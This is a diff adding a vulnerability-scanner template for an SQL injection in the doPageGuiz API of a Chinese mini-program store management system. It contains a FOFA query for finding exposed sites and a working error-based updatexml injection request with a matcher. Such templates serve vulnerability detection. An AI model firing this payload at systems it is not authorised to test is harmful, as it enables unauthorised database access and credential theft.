@@ -1,0 +1,29 @@
+id: wannengmendian-doPageGuiz-sql
+
+info:
+  name: 万能门店小程序管理系统 doPageGuiz 接口 SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/comhome/cases/index.html"
+      万能门店小程序管理系统在 doPageGuiz 接口实现中存在 SQL 注入安全缺陷。攻击者可通过构造恶意 SQL 查询参数，绕过身份验证机制直接访问后端数据库，实现敏感数据泄露（包括但不限于管理员凭据、用户个人信息）。在特定权限条件下，该漏洞可能被进一步利用执行任意代码，导致服务器端恶意文件写入及系统权限接管。
+  reference:
+  - https://mp.weixin.qq.com/s/7BAdVClaEF7YpwQA-eO6gg
+  tags: 万能门店小程序管理系统
+
+
+
+http:
+- raw:
+  - |
+    POST /api/wxapps/doPageGuiz HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    suid=1&uniacid=1 and updatexml(1,concat(0x7e,(select md5('123123')),0x7e),1)--+
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '~4297f44b13955235245b2497399d7a9'
